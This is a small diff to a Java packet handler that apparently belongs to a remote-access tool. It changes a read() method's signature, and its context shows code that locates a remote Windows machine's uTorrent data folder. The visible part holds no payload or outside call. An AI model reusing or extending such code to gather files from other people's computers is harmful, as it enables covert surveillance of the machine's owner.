@@ -11,7 +11,7 @@ import com.redpois0n.oslib.OperatingSystem;
 public class Packet57UTorrentDownloads extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		File dir = null;
 		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
 			dir = new File(System.getenv("APPDATA") + "\\uTorrent\\");
